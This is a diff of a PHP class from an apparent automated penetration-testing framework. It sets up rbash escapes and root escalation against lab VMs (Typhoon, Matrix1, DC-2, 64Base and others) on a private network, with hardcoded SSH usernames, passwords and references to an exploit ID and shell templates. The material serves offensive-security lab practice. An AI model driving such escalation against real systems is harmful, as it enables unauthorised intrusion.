@@ -103,7 +103,7 @@ class poc4lan extends poc4web {
             $this->article("CREATE Template CMD", $template_cmd);
             $this->article("CREATE Template SHELL", $template_shell);
             $this->pause();
-            $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$user_name_pass);
+            $obj_lan = new check4linux8users($test->eth,$test->domain,$test->ip, $test->port, $test->protocol,$stream, $templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$pass);
             $obj_lan->poc($test->flag_poc);
             
             return $obj_lan->$fonction2exec();
@@ -655,67 +655,6 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
     
     
     
-    public function poc4bypass_restricted_test(){ // OK
-        $this->ssTitre(__FUNCTION__);
-        $eth = 'vmnet6';
-        $domain = 'hack.vlan';
-        
-        
-        $ip = "10.60.10.147"; // OK typhoon 1.02 exploit_37292
-        $port = "22";
-        $protocol = "T";
-        $user_name_created = "typhoon" ;
-        $user_name_pass = "789456123";
-        
-        
-        $ip = "10.60.10.148"; // OK Super Mario exploit_37292
-        $port = "22";
-        $protocol = "T";
-        $user_name_created = "luigi" ;
-        $user_name_pass = "luigi1";
-        
-        $ip = "10.60.10.149"; // OK SecOS 1 exploit_37292
-        $port = "22";
-        $protocol = "T";
-        $user_name_created = "spiderman" ;
-        $user_name_pass = "CrazyPassword!";
-        
-        
-        $ip = "10.60.10.163"; // 64Base 1.01
-        $port = "62964";
-        $protocol = "T";
-        $user_name_created = "64base" ;
-        $user_name_pass = 'NjRiYXNlNWgzNzcK';
-        
-        
-        $ip = "10.60.10.140"; // Matrix1
-        $port = "22";
-        $protocol = "T";
-        $user_name_created = "guest" ;
-        $user_name_pass = "k1ll0r7n";
-        
-        $ip = "10.60.10.141"; // DC-2
-        $port = "7744";
-        $protocol = "T";
-        $user_name_created = "jerry" ;
-        $user_name_pass = "adipiscing";
-        $user_name_created = "tom" ;
-        $user_name_pass = "parturient";
-        
-        $ip = "10.60.10.163"; // 64Base 1.01
-        $port = "62964";
-        $protocol = "T";
-        
-        $login = "64base" ;
-        $pass = 'NjRiYXNlNWgzNzcK';
-        $titre = "restricted Bash - rbash";
-        $fonction2exec = "lan2start";
-        $vm = "";
-        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
-        
-    }
-    
-    
     public function poc4root8jobs(){
         $this->ssTitre(__FUNCTION__);
         $eth = 'vmnet6';
@@ -862,29 +801,33 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
         $eth = 'vmnet6';
         $domain = 'hack.vlan';
                
-        $ip = "10.60.10.163"; // 64Base 1.01
+        $ip = "10.60.10.163"; // 64Base 1.01 OK 
         $port = "62964";
         $protocol = "T";
-
-        
-        $login = "64base" ;
+       $login = "64base" ;
         $pass = 'NjRiYXNlNWgzNzcK';
         $titre = "restricted Bash - rbash";
         $fonction2exec = "lan2start";
         $vm = "";
         
         
-        $ip = "10.60.10.141"; // DC-2 -> TP
+        $ip = "10.60.10.141"; // DC-2 HAND -> TP
         $port = "7744";
         $protocol = "T";
-        
-        
         $login = "tom" ;
         $pass = 'parturient';
         $titre = "restricted Bash - rbash";
         $fonction2exec = "lan2start";
         $vm = "";
         
+        $ip = "10.60.10.140"; // Matrix 1 - TP
+        $port = "22";
+        $protocol = "T";
+        $login = "guest" ;
+        $pass = 'k1ll0r7n';
+        $titre = "restricted Bash - rbash";
+        $fonction2exec = "lan2start";
+        $vm = "";
         
         $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
         
